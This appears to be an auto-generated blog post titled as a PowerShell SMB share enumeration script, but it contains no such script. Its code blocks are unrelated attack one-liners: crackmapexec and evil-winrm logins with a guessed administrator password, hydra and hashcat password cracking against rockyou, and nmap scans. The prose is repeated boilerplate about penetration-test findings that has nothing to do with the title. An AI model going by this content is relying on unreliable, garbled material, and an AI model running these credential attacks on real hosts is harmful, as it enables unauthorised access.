---
TitleSEO: "SMB Share Enumeration Script in PowerShell | ZureFX"
TitlePost: "SMB Share Enumeration Script — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for smb share enumeration script. Built for security research and automation."
Keywords: "c, bash, scanner, powershell"
URL: "https://zurefx.github.io/scripting/script-smb-share-enumeration-script-159.html"
URL_IMAGES: ""
Date: "2025-06-21"
Tags: "C, Bash, Scanner, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-smb-share-enumeration-script-159"
Permalink: "/scripting/script-smb-share-enumeration-script-159.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `mimikatz`
- `hydra`
- `sharphound`

## Implementation

### Core Logic

The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
feroxbuster -h
feroxbuster -h
crackmapexec smb 10.93.223.116 -u administrator -p 'P@ssw0rd!' --shares
```

The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Helper Functions

Token impersonation allowed elevation to SYSTEM privileges on the target. The backup files contained sensitive information that should not have been accessible.

```powershell
evil-winrm -i 10.75.113.200 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.45.208.156 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code.

```bash
crackmapexec smb 10.129.93.212 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p445,110,8888 10.90.184.77 -oN scan.txt
```

### Advanced Options

Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.89.125.227 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Output

### Example Output

The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file.

```
[+] Scanning target...
[+] Found 16 results
[+] Done in 3.73s
```
